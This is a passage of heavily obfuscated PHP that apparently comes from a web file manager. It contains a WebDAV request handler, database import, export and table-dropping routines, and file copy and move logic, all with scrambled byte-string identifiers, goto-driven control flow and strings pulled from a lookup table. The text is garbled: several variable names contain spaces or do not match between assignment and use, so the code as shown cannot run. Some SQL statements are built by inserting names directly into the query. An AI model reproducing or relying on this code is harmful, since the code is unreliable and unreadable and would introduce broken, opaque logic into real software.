$_SERVER[$b¤Ğ”ºí™[1352]] . $b¤Ğ”ºí™[1772]; return array($b¤Ğ”ºí™[1759] => 207, $b¤Ğ”ºí™[1760] => "\74\104\72\x6d\x75\x6c\x74\151\163\x74\141\164\x75\x73\x20\170\155\x6c\156\x73\72\x44\x3d\42\104\x41\x56\72\x22\x3e\xa{$a‚¥Úä‰ì}\12\x3c\x2f\x44\x3a\155\165\154\x74\151\x73\164\x61\164\165\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $a’ÎÏÆÃñğ =& $_SERVER[£ü]; $dÔœÓÒãâ = $this->uploadFile(); if ($dÔœÓÒãâ) { $d„£Œ —–Õ = 204; } else { $dÔœÓÒãâ = $a’ÎÏÆÃñğ[33]; $d„£Œ —–Õ = 201; } $c×Ûùƒµ†³ = $this->pathPut($this->path, $dÔœÓÒãâ); if ($c×Ûùƒµ†³ == !1) { $d„£Œ —–Õ = 404; } return array($a’ÎÏÆÃñğ[1759] => $d„£Œ —–Õ); } private function uploadFile() { goto C”Íøˆ‚µÁ; fäìÇÊÌˆ: if (@filesize($DŸğ¼æßš) > 0) { return $DŸğ¼æßš; } @unlink($DŸğ¼æßš); return !1; goto DÀÀ½›ˆÑ; B´›¸÷‘ãµ: while (!feof($e‰ÎŒ†­ö)) { fwrite($aˆÊ’ß®”ì, fread($e‰ÎŒ†­ö, 1024 * 200)); } fclose($e‰ÎŒ†­ö); fclose($aˆÊ’ß®”ì); goto fäìÇÊÌˆ; cÒ‚¼§„…š: $aˆÊ’ß®”ì = @fopen($DŸğ¼æßš, $e½êå‘ÌßÚ[1481]); $e‰ÎŒ†­ö = @fopen($e½êå‘ÌßÚ[1774], $e½êå‘ÌßÚ[1480]); if (!$e‰ÎŒ†­ö || !$aˆÊ’ß®”ì) { @unlink($DŸğ¼æßš); return !1; } goto B´›¸÷‘ãµ; C”Íøˆ‚µÁ: $e½êå‘ÌßÚ =& $_SERVER[£ü]; @mk_dir(TEMP_FILES); $DŸğ¼æßš = TEMP_FILES . $e½êå‘ÌßÚ[1773] . rand_string(32); goto cÒ‚¼§„…š; DÀÀ½›ˆÑ: } public function httpMKCOL() { $EõŸÅáÃ—Ï =& $_SERVER[£ü]; if ($this->pathExists($this->path)) { return array($EõŸÅáÃ—Ï[1022] => 409); } $dÅ­‘ÄŸÅ† = $this->pathMkdir($this->path); return array($EõŸÅáÃ—Ï[1022] => $dÅ­‘ÄŸÅ† ? 201 : 403); } public function httpMOVE() { $Dòğ¥‹ÓÔ =& $_SERVER[£ü]; $c¥È‚ÕÊ† = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$Dòğ¥‹ÓÔ[1775]])) { $f¶®èÔ¿ ¹[$Dòğ¥‹ÓÔ[1776]] = $_SERVER[$Dòğ¥‹ÓÔ[1775]] == $Dòğ¥‹ÓÔ[1777]; } $Bô¨²’È‚½ = $this->pathMove($this->path, $c¥È‚ÕÊ†); return array($Dòğ¥‹ÓÔ[1022] => $Bô¨²’È‚½ ? 201 : 404); } public function httpCOPY() { $A®»–Å¢¦Ğ = $this->parsePath($this->pathGet(!0)); $FÉ‚ó†œ• = $this->pathCopy($this->path, $A®»–Å¢¦Ğ); return array($_SERVER[£ü][1022] => $FÉ‚ó†œ• ? 201 : 404); } public function httpDELETE() { $aÂ·ƒ•Ü’ó = $this->pathRemove($this->path); return array($_SERVER[£ü][1022] => $aÂ·ƒ•Ü’ó ? 200 : 503); } public function httpLOCK() { $CÅÓ¤ˆ‘Ùµ =& $_SERVER[£ü]; $D…ØÛßùÜ« = md5($this->path); $Cèì´ÎÎ¦® = $CÅÓ¤ˆ‘Ùµ[1778] . $this->xmlGet($CÅÓ¤ˆ‘Ùµ[1779]) . $CÅÓ¤ˆ‘Ùµ[1780] . $D…ØÛßùÜ« . $CÅÓ¤ˆ‘Ùµ[1781]; return array($CÅÓ¤ˆ‘Ùµ[1022] => 200, $CÅÓ¤ˆ‘Ùµ[1189] => array($CÅÓ¤ˆ‘Ùµ[1782] . $D…ØÛßùÜ«, $CÅÓ¤ˆ‘Ùµ[1783]), $CÅÓ¤ˆ‘Ùµ[1784] => $Cèì´ÎÎ¦®); } public function httpUNLOCK() { return array($_SERVER[£ü][1022] => 204); } public function xmlGet($B›ÔµÆãâ˜) { goto BÏÂğ‘™Ş¤; BÏÂğ‘™Ş¤: $C’¿‚­Úğ² =& $_SERVER[£ü]; static $b§ÄØè“Š‡ = false; if (!$b§ÄØè“Š‡) { $dŸ¥Ö—Ì â = file_get_contents($C’¿‚­Úğ²[1785]); $b§ÄØè“Š‡ = new DOMDocument(); $b§ÄØè“Š‡->loadXML($dŸ¥Ö—Ì â); } goto b‰¢ôÆ­Àİ; DùŸÁ¼ä›: return $C’¿‚­Úğ²[33]; goto CØã­…”Š‡; b‰¢ôÆ­Àİ: $eçÅŒùƒì¿ = array_shift(explode($C’¿‚­Úğ²[8], $B›ÔµÆãâ˜)); $D†Ê¹ˆ×È‰ = $b§ÄØè“Š‡->getElementsByTagNameNS($C’¿‚­Úğ²[1786], $eçÅŒùƒì¿); if ($D†Ê¹ˆ×È‰) { return $D†Ê¹ˆ×È‰[0]->nodeValue; } goto DùŸÁ¼ä›; CØã­…”Š‡: } public static function response($dËíƒÆ¥™ß) { goto BœŸè Äê; e÷‰Æ®¡áÇ: if (is_string($dËíƒÆ¥™ß[$CÊÎæ‚•ª¶[1784]])) { header($CÊÎæ‚•ª¶[1787]); $aé­é—º¡² = $CÊÎæ‚•ª¶[1788] . $CÊÎæ‚•ª¶[214] . $dËíƒÆ¥™ß[$CÊÎæ‚•ª¶[1784]]; echo $aé­é—º¡²; } goto eâÃ³èÇ×; BœŸè Äê: $CÊÎæ‚•ª¶ =& $_SERVER[£ü]; $c¹‹‚…ô³ë = is_array($dËíƒÆ¥™ß[$CÊÎæ‚•ª¶[1189]]) ? $dËíƒÆ¥™ß[$CÊÎæ‚•ª¶[1189]] : array(); $c¹‹‚…ô³ë[] = HttpHeader::code($dËíƒÆ¥™ß[$CÊÎæ‚•ª¶[1022]]); goto f§»Ï¢¥Ñ; f§»Ï¢¥Ñ: $c¹‹‚…ô³ë[] = $CÊÎæ‚•ª¶[1726]; $c¹‹‚…ô³ë[] = $CÊÎæ‚•ª¶[1727]; foreach ($c¹‹‚…ô³ë as $B¿÷ ËŠ˜Ú) { header($B¿÷ ËŠ˜Ú); } goto e÷‰Æ®¡áÇ; eâÃ³èÇ×: } } goto A«„‘»ãõá; A™ÛŸƒ…îâ: class DbManage { function __construct($FæÜí‘Ä‹±, $C§ÕÕÇï = '') { $this->database = $FæÜí‘Ä‹±; $this->type = $C§ÕÕÇï; } public function model($eòŞÛ™‹·ï = '') { return new ModelBase($eòŞÛ™‹·ï, $_SERVER[£ü][33], $this->database); } public function db($FÊ‘„ÍîĞ‘ = false) { goto Fõ¤õ­†ˆß; fÁõî¦Û—: $this->database = $d‚­¡Œïœ¹; $BòàÔ‰ƒß->execute("\x75\x73\145\40\140{$cÚ¢‡½ß±¾}\x60"); return $BòàÔ‰ƒß; goto E¹Ù‹³“†; cÇÔ¿‰„Óİ: $cÚ¢‡½ß±¾ = $d‚­¡Œïœ¹[$dÃ‚éòö‡ò[231]]; $d‚­¡Œïœ¹[$dÃ‚éòö‡ò[231]] = $dÃ‚éòö‡ò[33]; if ($d‚­¡Œïœ¹[$dÃ‚éòö‡ò[878]] == $dÃ‚éòö‡ò[713]) { $C¶Ã”š·æñ = $d‚­¡Œïœ¹[$dÃ‚éòö‡ò[877]]; $d‚­¡Œïœ¹[$dÃ‚éòö‡ò[877]] = substr($C¶Ã”š·æñ, 0, strrpos($C¶Ã”š·æñ, $dÃ‚éòö‡ò[963])); } goto bÂ¸ÛŠô™ø; bÂ¸ÛŠô™ø: $this->database = $d‚­¡Œïœ¹; $BòàÔ‰ƒß = $this->model()->db(); $d‚ÂéçÒİæ = $BòàÔ‰ƒß->execute("\x73\x68\157\x77\40\x64\141\x74\141\x62\x61\163\x65\163\40\x6c\151\x6b\x65\x20\x27{$cÚ¢‡½ß±¾}\47"); goto fÅÎ¯¶Ÿâ§; fÅÎ¯¶Ÿâ§: if (!$d‚ÂéçÒİæ) { $BòàÔ‰ƒß->execute("\x63\162\145\141\164\145\x20\144\x61\164\141\142\x61\x73\x65\40\x60{$cÚ¢‡½ß±¾}\140"); } $d‚­¡Œïœ¹[$dÃ‚éòö‡ò[231]] = $cÚ¢‡½ß±¾; if ($d‚­¡Œïœ¹[$dÃ‚éòö‡ò[878]] == $dÃ‚éòö‡ò[713]) { $d‚­¡Œïœ¹[$dÃ‚éòö‡ò[877]] .= $dÃ‚éòö‡ò[963] . $cÚ¢‡½ß±¾; } goto fÁõî¦Û—; Fõ¤õ­†ˆß: $dÃ‚éòö‡ò =& $_SERVER[£ü]; $d‚­¡Œïœ¹ = $this->database; if ($this->type == $dÃ‚éòö‡ò[9] || !$FÊ‘„ÍîĞ‘) { return $this->model()->db(); } goto cÇÔ¿‰„Óİ; E¹Ù‹³“†: } public function createTable($d®Ó¶¹Ö„, $EÄª¯‡Š¯ = null) { $BÄó²ç¿® =& $_SERVER[£ü]; if (!IO::exist($d®Ó¶¹Ö„)) { show_json(LNG($BÄó²ç¿®[964]), !1); } $a½Ö²¯ö³º = sqlSplit(IO::getContent($d®Ó¶¹Ö„)); foreach ($a½Ö²¯ö³º as $C‹äğè´Ö) { if ($EÄª¯‡Š¯) { $aĞà†’ëÅœ = stripos($C‹äğè´Ö, $BÄó²ç¿®[965]) === 0; if ($aĞà†’ëÅœ) { $EÄª¯‡Š¯->task[$BÄó²ç¿®[966]] += 1; } } $this->model()->db()->execute($C‹äğè´Ö); if ($EÄª¯‡Š¯ && $aĞà†’ëÅœ) { $AšĞ¯õñÀ = $BÄó²ç¿®[967]; preg_match($AšĞ¯õñÀ, $C‹äğè´Ö, $fÁ·¡¢¾®Ş); $EÄª¯‡Š¯->task[$BÄó²ç¿®[968]] = trim($f¾’ÓààË†[0], $BÄó²ç¿®[814]); $EÄª¯‡Š¯->update(1); } } $this->taskToCache($EÄª¯‡Š¯); } public function insertTable($e“Œ¯Ø›¹Ç, $CãÄŠ‰Á˜ = null) { $BÖ£“—×œ =& $_SERVER[£ü]; foreach ($e“Œ¯Ø›¹Ç as $föÜ‘Ğ¢Ùœ) { $aŸØ¦¡õö“ = basename($föÜ‘Ğ¢Ùœ); $aŸØ¦¡õö“ = substr($aŸØ¦¡õö“, 0, strrpos($aŸØ¦¡õö“, $BÖ£“—×œ[93])); if ($CãÄŠ‰Á˜) { $CãÄŠ‰Á˜->task[$BÖ£“—×œ[968]] = $aŸØ¦¡õö“; } if (get_filesize($föÜ‘Ğ¢Ùœ) == 0) { continue; } $fğÏÚ¶ğ‹ = $this->sqlToDb($föÜ‘Ğ¢Ùœ, $CãÄŠ‰Á˜); if (!$fğÏÚ¶ğ‹) { show_json(LNG($BÖ£“—×œ[969]) . "\x5b{$aŸØ¦¡õö“}\135", !1); } } $this->taskToCache($CãÄŠ‰Á˜); } public function sqlFromDb($a’Á–×ë»¾, $bÀê«Ïï©, $câøê£—¨Ğ = null, $e¢ªÌÊÊƒÃ = null) { goto F°©ÑÇ èÆ; F°©ÑÇ èÆ: if ($câøê£—¨Ğ) { $câøê£—¨Ğ->task[$_SERVER[£ü][968]] = $a’Á–×ë»¾; } $BìÀ£»ğ« = $this->model($a’Á–×ë»¾); $bâ›£”‹ÄÒ = 0; goto F‘Úì“×ùÖ; e÷‰˜Ãˆ: $fá©õ˜‹— = $BìÀ£»ğ«->getPk(); $cÒ¡‘Ëğ‡· = $BìÀ£»ğ«->getDbFields(); do { $CÑ˜£’è§Ü = $BìÀ£»ğ«->field($cÒ¡‘Ëğ‡·)->order($fá©õ˜‹— . $_SERVER[£ü][971])->selectPage($E˜İöãŸ‹ì, $EÚ®ƒÆ—å); $FÍµÍÑ·®Æ = !empty($CÑ˜£’è§Ü[$_SERVER[£ü][351]]) ? $CÑ˜£’è§Ü[$_SERVER[£ü][351]] : array(); if (!($BøÖÂÜ²¬ = count($FÍµÍÑ·®Æ))) { break; } if ($câøê£—¨Ğ) { $câøê£—¨Ğ->task[$_SERVER[£ü][966]] += $BøÖÂÜ²¬; } $bôŠó¦š¿Â = array(); foreach ($FÍµÍÑ·®Æ as $Cí”£—ËŞ‹) { if ($e¢ªÌÊÊƒÃ) { $Cí”£—ËŞ‹[$_SERVER[£ü][75]] = "\x7b\151\157\x3a{$e¢ªÌÊÊƒÃ}\175" . substr($Cí”£—ËŞ‹[$_SERVER[£ü][75]], strlen("\173\151\157\72{$Cí”£—ËŞ‹[$_SERVER[£ü][739]]}\175")); $Cí”£—ËŞ‹[$_SERVER[£ü][739]] = $e¢ªÌÊÊƒÃ; } $bôŠó¦š¿Â[] = $_SERVER[£ü][972] . $this->sqlEncode($Cí”£—ËŞ‹) . $_SERVER[£ü][973]; } $FííÙãåÖ = "\111\116\x53\x45\x52\124\40\x49\116\124\x4f\x20\140{$a’Á–×ë»¾}\x60\x20\x28\140" . implode($_SERVER[£ü][974], $cÒ¡‘Ëğ‡·) . $_SERVER[£ü][975]; fwrite($F ¦µõª‡Œ, $FííÙãåÖ . implode($_SERVER[£ü][976], $bôŠó¦š¿Â) . $_SERVER[£ü][67] . PHP_EOL); $EÚ®ƒÆ—å++; $bâ›£”‹ÄÒ += $BøÖÂÜ²¬; if ($câøê£—¨Ğ) { $câøê£—¨Ğ->update($BøÖÂÜ²¬); } } while ($BøÖÂÜ²¬ == $E˜İöãŸ‹ì); goto b¡Ÿ»¹ŠÃ; F‘Úì“×ùÖ: $EÚ®ƒÆ—å = 1; $E˜İöãŸ‹ì = 500; $F ¦µõª‡Œ = fopen($bÀê«Ïï©, $_SERVER[£ü][970]); goto e÷‰˜Ãˆ; b¡Ÿ»¹ŠÃ: fclose($F ¦µõª‡Œ); return $bâ›£”‹ÄÒ; goto A Ş«Äšğ; A Ş«Äšğ: } public function sqlToDb($a‹Ã ÆÄ¢´, $Fµ­Ò¦ó¶å = null) { goto aƒÔ¾ËªØ; e™£ƒÒáª½: $Bˆ‹¸º¸‰” = 500 + 1; while (!feof($c¨½™é›Šö)) { if ($Fµ­Ò¦ó¶å && $E¾ˆÑ§Ø‡ != 0) { $Fµ­Ò¦ó¶å->task[$FŞ–¹ÅŞïœ[966]] += 1; } $E¾ˆÑ§Ø‡++; $A•¿ãğ¾—‡ = trim(fgets($c¨½™é›Šö)); $dÛ´ÔØã¼£ .= $FŞ–¹ÅŞïœ[50] . $this->sqlDecode($A•¿ãğ¾—‡, $this->type); if ($E¾ˆÑ§Ø‡ == $Bˆ‹¸º¸‰”) { $dÛ´ÔØã¼£ = rtrim(trim($dÛ´ÔØã¼£), $FŞ–¹ÅŞïœ[67]); if (!$A”²ÀŒÂÈ->execute($dÛ´ÔØã¼£)) { return !1; } if ($Fµ­Ò¦ó¶å) { $Fµ­Ò¦ó¶å->update($E¾ˆÑ§Ø‡ - 1); } $dÛ´ÔØã¼£ = $FŞ–¹ÅŞïœ[33]; $E¾ˆÑ§Ø‡ = 0; } } fclose($c¨½™é›Šö); goto D¶Ïï×ƒ¢„; Dèñ’ƒ´Ş: if (!$c¨½™é›Šö) { return !1; } $E¾ˆÑ§Ø‡ = 0; $dÛ´ÔØã¼£ = $FŞ–¹ÅŞïœ[33]; goto e™£ƒÒáª½; aƒÔ¾ËªØ: $FŞ–¹ÅŞïœ =& $_SERVER[£ü]; $A”²ÀŒÂÈ = $this->model()->db(); $c¨½™é›Šö = @fopen($a‹Ã ÆÄ¢´, $FŞ–¹ÅŞïœ[977]); goto Dèñ’ƒ´Ş; D¶Ïï×ƒ¢„: if ($dÛ´ÔØã¼£) { $dÛ´ÔØã¼£ = rtrim(trim($dÛ´ÔØã¼£), $FŞ–¹ÅŞïœ[67]); if (!$A”²ÀŒÂÈ->execute($dÛ´ÔØã¼£)) { return !1; } if ($Fµ­Ò¦ó¶å) { $Fµ­Ò¦ó¶å->update($E¾ˆÑ§Ø‡ - 1); } } return !0; goto fÉ±ä¢ôÛ; fÉ±ä¢ôÛ: } public function dropTable($E•ß–íÁö = null) { $d´…µµù = $this->model()->db(); $FæÓ…Ó”™ = $E•ß–íÁö ? array($E•ß–íÁö) : $d´…µµù->getTables(); if (!$FæÓ…Ó”™) { return; } foreach ($FæÓ…Ó”™ as $E•ß–íÁö) { $d´…µµù->execute("\x64\x72\157\160\40\164\141\x62\154\x65\40\151\146\x20\145\x78\x69\163\164\x73\40\x60{$E•ß–íÁö}\x60"); } } private function taskToCache($B´„Ê®ñ»Æ = null) { $eéå„Ó¬¨œ =& $_SERVER[£ü]; if (!$B´„Ê®ñ»Æ) { return; } $Bøï…Èìõà = array($eéå„Ó¬¨œ[968] => $B´„Ê®ñ»Æ->task[$eéå„Ó¬¨œ[968]], $eéå„Ó¬¨œ[966] => $B´„Ê®ñ»Æ->task[$eéå„Ó¬¨œ[966]], $eéå„Ó¬¨œ[978] => $B´„Ê®ñ»Æ->task[$eéå„Ó¬¨œ[978]]); if ($Bøï…Èìõà[$eéå„Ó¬¨œ[966]] == $Bøï…Èìõà[$eéå„Ó¬¨œ[978]]) { $Bøï…Èìõà[$eéå„Ó¬¨œ[685]] = 1; } Cache::set($eéå„Ó¬¨œ[979] . $B´„Ê®ñ»Æ->task[$eéå„Ó¬¨œ[364]], $Bøï…Èìõà); $B´„Ê®ñ»Æ->end(); } private function sqlEncode($cíà¯ôÃî®) { $Aè¨òÁá¨ =& $_SERVER[£ü]; $B¹Õ–à = array(); foreach ($cíà¯ôÃî® as $aø¦·óìğÎ) { if (is_array($aø¦·óìğÎ)) { $aø¦·óìğÎ = json_encode_force($aø¦·óìğÎ); } $aø¦·óìğÎ = addslashes($aø¦·óìğÎ); $aø¦·óìğÎ = str_replace(array($Aè¨òÁá¨[980], $Aè¨òÁá¨[214]), array($Aè¨òÁá¨[981], $Aè¨òÁá¨[982]), $aø¦·óìğÎ); $B¹Õ–à[] = str_replace($Aè¨òÁá¨[55], $Aè¨òÁá¨[983], $aø¦·óìğÎ); } return $Aè¨òÁá¨[55] . implode($Aè¨òÁá¨[984], $B¹Õ–à) . $Aè¨òÁá¨[55]; } private function sqlDecode($cÕÒ¸ˆÙÍ, $C’ŒåŠÖæ) { $FÃöšåªÊ× =& $_SERVER[£ü]; $cÕÒ¸ˆÙÍ = str_replace(array($FÃöšåªÊ×[981], $FÃöšåªÊ×[982]), array($FÃöšåªÊ×[980], $FÃöšåªÊ×[214]), $cÕÒ¸ˆÙÍ); if ($C’ŒåŠÖæ == $FÃöšåªÊ×[9]) { $cÕÒ¸ˆÙÍ = stripslashes($cÕÒ¸ˆÙÍ); } return $cÕÒ¸ˆÙÍ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($bƒï¤Ñœëä, $C§„ØĞ‡½Ş) { $A²ŠŒÈ¥è = self::driverMake($C§„ØĞ‡½Ş[0]); if (method_exists($A²ŠŒÈ¥è, $bƒï¤Ñœëä)) { return @call_user_func_array(array($A²ŠŒÈ¥è, $bƒï¤Ñœëä), $C§„ØĞ‡½Ş); } if (method_exists($A²ŠŒÈ¥è, $_SERVER[£ü][985])) { return @call_user_func_array(array($A²ŠŒÈ¥è, $bƒï¤Ñœëä), $C§„ØĞ‡½Ş); } else { if (method_exists(self, $bƒï¤Ñœëä)) { return @call_user_func_array(array(self, $bƒï¤Ñœëä), $C§„ØĞ‡½Ş); } else { call_user_func_array(array(parent, $bƒï¤Ñœëä), $C§„ØĞ‡½Ş); } } } public static function init($E˜—…¿êÙÓ) { return self::driverMake($E˜—…¿êÙÓ); } public static function copy($DÆãŒ¢ê¯‡, $aÄ‚˜»ÃŸ“, $Aø²ÎĞÅ² = false, $A„“ìŠƒç = false) { return self::copyMove($DÆãŒ¢ê¯‡, $aÄ‚˜»ÃŸ“, $Aø²ÎĞÅ², $_SERVER[£ü][486], $A„“ìŠƒç); } public static function move($EùÛæ‰Ğ¯, $AÛÈ¤öà¶ã, $dˆ£‰Éø‘à = false, $dîÈÅ©¾Ìã = false) { return self::copyMove($EùÛæ‰Ğ¯, $AÛÈ¤öà¶ã, $dˆ£‰Éø‘à, $_SERVER[£ü][488], $dîÈÅ©¾Ìã); } public static function saveFile($fÍÚšìÎì, $B¸Š÷‹…Œ, $c³ËåØÀÏî = true) { goto bÛãˆ—š•¾; dµ­éøíŠ: $bç İ©é¤¾ = self::copyFile($FáÕ›‡ªˆ, $fÍÚšìÎì, $a³ÀÅÈàÕ‹, $fãÅ§Ç“èÂ, $cÑ®¾­Ë[$b¶ÃˆŒ™[28]], $B¤ë¯¯İÅ˜); if ($C¼ªãğİ‚·) { $bç İ©é¤¾ = $C¼ªãğİ‚·->getPathOuter($bç İ©é¤¾); } return $bç İ©é¤¾; goto Eâê©ËÈéÄ; e´ğ¬„ªÊ: $fãÅ§Ç“èÂ = $a³ÀÅÈàÕ‹->pathFather($B¸Š÷‹…Œ); $B¤ë¯¯İÅ˜ = !0; if (!$c³ËåØÀÏî && self::driverIsSame($FáÕ›‡ªˆ, $a³ÀÅÈàÕ‹)) { $B¤ë¯¯İÅ˜ = !1; } goto dµ­éøíŠ; bÛãˆ—š•¾: $b¶ÃˆŒ™ =& $_SERVER[£ü]; $cÑ®¾­Ë = self::info($B¸Š÷‹…Œ); $FáÕ›‡ªˆ = self::driverMake($fÍÚšìÎì); goto B´­ÈâÏö; B´­ÈâÏö: $a³ÀÅÈàÕ‹ = self::driverMake($B¸Š÷‹…Œ); $C¼ªãğİ‚· = !1; if ($a³ÀÅÈàÕ‹->pathParse[$b¶ÃˆŒ™[986]]) { $fæ©©‚…íØ = $a³ÀÅÈàÕ‹->pathParse[$b¶ÃˆŒ™[986]]; $C¼ªãğİ‚· = $a³ÀÅÈàÕ‹; $a³ÀÅÈàÕ‹ = self::driverMake($fæ©©‚…íØ); } goto e´ğ¬„ªÊ; Eâê©ËÈéÄ: } private static function copyMove($Cè×Š•ëËÇ, $fŠ¸œÃÃ’ù, $DõğÁ¯æ”, $bøêÎì©Ø, $EŸååí‡ = false) { goto aãï¦§Á••; aˆçÖÈ¹óÒ: $e’ËÔµ×„ = $D¥×°¼”À->isFile($Cè×Š•ëËÇ); if (!$e’ËÔµ×„ && $BˆÄ†‰‡ù->getType() == $AÆßê‰ÑŠÈ[683] && $D¥×°¼”À->getType() == $AÆßê‰ÑŠÈ[103]) { $b§­µ³áƒ = $BˆÄ†‰‡ù->copyFolderFromIO($D¥×°¼”À, $Cè×Š•ëËÇ, $fŠ¸œÃÃ’ù, $DõğÁ¯æ”, $f‡Ûˆ¬¨ß×, $EŸååí‡); } else { $b§­µ³áƒ = self::copyPath($D¥×°¼”À, $Cè×Š•ëËÇ, $BˆÄ†‰‡ù, $fŠ¸œÃÃ’ù, $DõğÁ¯æ”, $f‡Ûˆ¬¨ß×, $e’ËÔµ×„, $EŸååí‡); } if ($b§­µ³áƒ && $f‡Ûˆ¬¨ß×) { $D¥×°¼”À->remove($Cè×Š•ëËÇ); } goto f×÷˜‘‹ÔØ; B‰áƒ••ÂÒ: $D¥×°¼”À = self::driverMake($Cè×Š•ëËÇ); $BˆÄ†‰‡ù = self::driverMake($fŠ¸œÃÃ’ù); $f‡Ûˆ¬¨ß× = $bøêÎì©Ø == $AÆßê‰ÑŠÈ[488]; goto D‡Û¨ø°Ë¿; f×÷˜‘‹ÔØ: if ($aÁ¡¢°Ê˜È) { $b§­µ³áƒ = $aÁ¡¢°Ê˜È->getPathOuter($b§­µ³áƒ); } return $b§­µ³áƒ; goto b‘£æ±Œà; aãï¦§Á••: $AÆßê‰ÑŠÈ =& $_SERVER[£ü]; if (!$Cè×Š•ëËÇ || $Cè×Š•ëËÇ == $AÆßê‰ÑŠÈ[8] || !$fŠ¸œÃÃ’ù) { return !1; } ignore_timeout(); goto B‰áƒ••ÂÒ; D‡Û¨ø°Ë¿: $aÁ¡¢°Ê˜È = !1; if ($BˆÄ†‰‡ù->pathParse[$AÆßê‰ÑŠÈ[986]]) { $fŠ¸œÃÃ’ù = $BˆÄ†‰‡ù->pathParse[$AÆßê‰ÑŠÈ[986]]; $aÁ¡¢°Ê˜È = $BˆÄ†‰‡ù; $BˆÄ†‰‡ù = self::driverMake($fŠ¸œÃÃ’ù); } self::check($D¥×°¼”À, $Cè×Š•ëËÇ, $BˆÄ†‰‡ù, $fŠ¸œÃÃ’ù); goto D‰¾ÆÇ¥šï; D‰¾ÆÇ¥šï: Hook::trigger($AÆßê‰ÑŠÈ[72], $D¥×°¼”À, $Cè×Š•ëËÇ, $BˆÄ†‰‡ù, $fŠ¸œÃÃ’ù); $fâØ‚ß÷é  = self::driverIsSame($D¥×°¼”À, $BˆÄ†‰‡ù); if ($fâØ‚ß÷é ) { if ($bøêÎì©Ø == $AÆßê‰ÑŠÈ[488] && trim($fŠ¸œÃÃ’ù, $AÆßê‰ÑŠÈ[8]) == trim($BˆÄ†‰‡ù->pathFather($Cè×Š•ëËÇ), $AÆßê‰ÑŠÈ[8])) { return $BˆÄ†‰‡ù->getPathOuter($Cè×Š•ëËÇ); } if (method_exists($BˆÄ†‰‡ù, $bøêÎì©Ø)) { return $BˆÄ†‰‡ù->{$bøêÎì©Ø}($Cè×Š•ëËÇ, $fŠ¸œÃÃ’ù, $DõğÁ¯æ”); } } goto aˆçÖÈ¹óÒ; b‘£æ±Œà: } private static function check($ašµùá„¬×, $f‚¡·¦Îæ, $a˜·öôÖ±Œ, &$dâ¼ìœÎ©) { $Fœ‘÷„ùŞ =& $_SERVER[£ü]; if (self::driverIsSame($ašµùá„¬×, $a˜·öôÖ±Œ) && $ašµùá„¬×->isFolder($f‚¡·¦Îæ) && $ašµùá„¬×->isParentOf($f‚¡·¦Îæ, $dâ¼ìœÎ©)) { show_json(LNG($Fœ‘÷„ùŞ[987]), !1); } if (!$ašµùá„¬×->exist($f‚¡·¦Îæ)) { show_json(LNG($Fœ‘÷„ùŞ[102]), !1); } } private static function copyPath($fˆ—’¢˜Ü, $eµ°ÎÕä‡Ø, $cÒ‰ÁÜã†¢, $E«Ş˜¥™Èš, $c×âñ¾Ø, $E••Û“§ŠÏ, $d¶–Î¼¡ĞÅ, $bÇšÌÌË‚Ã = false) { goto A¸ Ö“äó; fÆº ÃÇ…—: $FÂÖÜˆï¢® = array_merge($aôºî®ƒÍù[$A‘É¼¶ùí[73]], $aôºî®ƒÍù[$A‘É¼¶ùí[74]]); foreach ($FÂÖÜˆï¢® as $C†¦ù×Ü´Ä) { $A—Ş’ø‰‹É = $C†¦ù×Ü´Ä[$A‘É¼¶ùí[29]] == $A‘É¼¶ùí[164]; $eµ°ÎÕä‡Ø = $fˆ—’¢˜Ü->getPathInner($C†¦ù×Ü´Ä[$A‘É¼¶ùí[75]]); $DÉë½¤†‚ = self::copyPath($fˆ—’¢˜Ü, $eµ°ÎÕä‡Ø, $cÒ‰ÁÜã†¢, $E«Ş˜¥™Èš, $c×âñ¾Ø, $E••Û“§ŠÏ, $A—Ş’ø‰‹É); if (!$DÉë½¤†‚) { write_log($A‘É¼¶ùí[988] . $eµ°ÎÕä‡Ø . $A‘É¼¶ùí[989] . $E«Ş˜¥™Èš, $A‘É¼¶ùí[990]); } } return $Eè„šÍ·ñï; goto b¥Äø®ÈÈğ; A¸ Ö“äó: $A‘É¼¶ùí =& $_SERVER[£ü]; $fÌèˆ±Æ–é = $bÇšÌÌË‚Ã ? $bÇšÌÌË‚Ã : $fˆ—’¢˜Ü->getPathName($fˆ—’¢˜Ü->pathThis($eµ°ÎÕä‡Ø)); if ($c×âñ¾Ø) { $D…Â×‰ªß› = $cÒ‰ÁÜã†¢->fileNameExist($E«Ş˜¥™Èš, $fÌèˆ±Æ–é); $fÌèˆ±Æ–é = $cÒ‰ÁÜã†¢->fileNameAuto($E«Ş˜¥™Èš, $fÌèˆ±Æ–é, $c×âñ¾Ø, !$d¶–Î¼¡ĞÅ); $c×âñ¾Ø = $D…Â×‰ªß› ? $c×âñ¾Ø : !1; } goto eãô¢Õß‹–; eãô¢Õß‹–: if ($d¶–Î¼¡ĞÅ) { return self::copyFile($fˆ—’¢˜Ü, $eµ°ÎÕä‡Ø, $cÒ‰ÁÜã†¢, $E«Ş˜¥™Èš, $fÌèˆ±Æ–é, $E••Û“§ŠÏ); } if ($c×âñ¾Ø == REPEAT_RENAME_FOLDER) { $c×âñ¾Ø = !1; } $Eåªâ©ù®Œ = rtrim($E«Ş˜¥™Èš, $A‘É¼¶ùí[8]) . $A‘É¼¶ùí[8] . $fÌèˆ±Æ–é; goto Fø»’…óÎ; Fø»’…óÎ: $Eè„šÍ·ñï = $cÒ‰ÁÜã†¢->mkdir($cÒ‰ÁÜã†¢->getPath($Eåªâ©ù®Œ)); $E«Ş˜¥™Èš = $cÒ‰ÁÜã†¢->getPathInner($Eè„šÍ·ñï); $aôºî®ƒÍù = $fˆ—’¢˜Ü->listPath($eµ°ÎÕä‡Ø, !0); goto fÆº ÃÇ…—; b¥Äø®ÈÈğ: } private static function copyFile($BÍ™’Ï÷îÜ, $Cë‘Şé¡Ñª, $cŞˆ¢‚°æ’, $aæÆ½‹ƒ¡, $dğ¸Í¼ª“‚, $F“»Ÿ¹óÂª) { goto bø´¬À²¥¢; bø´¬À²¥¢: $C¥“ƒ‘—²» =& $_SERVER[£ü]; $aæÆ½‹ƒ¡ = $cŞˆ¢‚°æ’->getPath(rtrim($aæÆ½‹ƒ¡, $C¥“ƒ‘—²»[8]) . $C¥“ƒ‘—²»[8] . $dğ¸Í¼ª“‚); $D–…—×³ù‡ = $C¥“ƒ‘—²»[991] . time() . rand_string(5); goto a±µçİÏš‘; 